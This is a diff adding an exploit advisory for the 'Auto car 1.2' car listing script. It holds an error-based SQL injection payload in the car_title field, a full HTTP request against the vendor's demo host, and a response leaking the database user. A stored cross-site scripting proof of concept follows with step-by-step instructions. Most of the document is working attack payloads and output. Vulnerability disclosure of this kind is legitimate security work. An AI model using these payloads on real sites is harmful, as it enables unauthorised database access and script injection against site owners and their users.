@@ -1,0 +1,54 @@
+# Exploit Title: Auto car 1.2 - 'car_title' SQL Injection / Cross-Site Scripting
+# Date: 2018-05-22
+# Exploit Author: Borna nematzadeh (L0RD)
+# Vendor Homepage: https://codecanyon.net/item/auto-car-car-listing-script/19221368?s_rank=1159
+# Version: 1.2
+# Tested on: Win 10
+
+# POC 1: SQLi:
+
+# Parameter: car_title
+# Type: Error based
+# Payload: 1' and extractvalue(1,Concat(0x3a,user(),0x3a))#
+# test: http://target/scripts/autocar_preview/
+
+# Request:
+
+POST /scripts/autocar_preview/search-cars HTTP/1.1
+Host: kamleshyadav.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://kamleshyadav.com/scripts/autocar_preview/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+car_title=1' and extractvalue(1,Concat(0x3a,user(),0x3a))#
+
+# Response:
+
+HTTP/1.1 500 Internal Server Error
+Server: nginx/1.12.2
+Date: Tue, 22 May 2018 14:36:47 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1371
+Connection: keep-alive
+
+<h1>A Database Error Occurred</h1>
+<p>Error Number: 1105</p><p>XPATH syntax error:
+':kamleshy_event@localhost:'</p><p>SELECT
+*
+FROM `autocar_car_details`
+WHERE `car_status` = 1 AND `car_title` LIKE '%1' and
+extractvalue(1,Concat(0x3a,user(),0x3a))#%'</p>
+
+# POC 2: Cross site scripting:
+
+1) Create your account and navigate to "edit profile"
+2) Put this payload in "name" and update your profile:
+<script>alert('xss')</script>
+3) You will have an alert box in your page .
